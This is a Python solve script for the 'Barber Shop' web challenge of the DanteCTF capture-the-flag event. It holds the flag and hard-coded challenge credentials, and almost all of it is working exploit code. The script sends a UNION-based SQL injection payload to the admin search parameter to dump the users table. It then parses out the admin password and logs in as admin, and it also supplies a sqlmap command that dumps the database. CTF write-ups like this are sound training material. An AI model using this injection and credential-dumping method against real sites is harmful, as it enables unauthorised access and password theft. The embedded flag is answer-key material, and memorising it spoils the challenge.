"""
Barber Shop - Web - Easy
FLAG: DANTE{dant3_1s_inj3cting_everyb0dy_aaxxaa}
"""


import requests
from bs4 import BeautifulSoup

APP_ROOT = "https://barbershop.challs.dantectf.it"

session = requests.Session()


def dashboard_login(creds):
    """
    Login to the dashboard with the specified credentials
    Returns the HTML of the dashboard page
    """
    session.cookies.clear()
    url = f"{APP_ROOT}/login.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    response = session.post(url, headers=headers, data=creds)
    return response.text


def get_creds_from_dumped(injection_res):
    """
    Extracts the admin credentials from the dumped table.

    Table will be of the form:
    +---------+----------+----------+
    |  Name   | Surname  |  Phone   |
    +---------+----------+----------+
    |    1    | PASSWORD |  admin	|
    |    2    | PASSWORD |  barber	|
    +---------+----------+----------+

    We filter for the row where Phone == "admin", then extract the username and password from that row.
    """
    soup = BeautifulSoup(injection_res, "html.parser")
    table = soup.find("table")
    rows = table.find_all("tr")
    data = []
    headers = None
    for row in rows:
        if not headers:
            headers = [ele.text.strip() for ele in row.find_all("th")]
            continue
        row_data = [ele.text.strip() for ele in row.find_all("td")]
        data.append(dict(zip(headers, row_data)))

    # Filter for the admin row
    admin_data = list(filter(lambda d: d["Phone"] == "admin", data))[0]
    creds = {}
    # Create a dict of the form {username: admin, password: ADMIN_PASSWORD}
    creds["username"] = admin_data.pop("Phone")
    creds["password"] = admin_data.pop("Surname")
    return creds


def inject_search_query(payload):
    """
    Search query is vulnerable to SQL injection.
    This executes the payload and returns the HTML of the page.

    Note: You must be logged in to use this!

    Alternatively, you can use the SQLMAP command:
    sqlmap --url=https://barbershop.challs.dantectf.it/admin.php?search=aaa -p search --cookie='PHPSESSID=YOUR_SESSION_HERE' --random-agent --dump
    """
    url = f"{APP_ROOT}/admin.php?search={payload}"
    response = session.get(url)
    return response.text


def main():
    """
    Exploit! :)
    """
    # Uses the credentials found at: /img/barber1.jpg
    barber_creds = {"username": "barber", "password": "dant3barbersh0p_cLIVeSidag"}
    dashboard_login(barber_creds)
    injection_res = inject_search_query(
        "' UNION ALL SELECT null, id, password, username  FROM users--"
    )
    admin_creds = get_creds_from_dumped(injection_res)
    admin_html = dashboard_login(admin_creds)
    flag = admin_html.split("DANTE{")[1].split("}")[0]
    print(f"FLAG: DANTE{{{flag}}}")


if __name__ == "__main__":
    main()
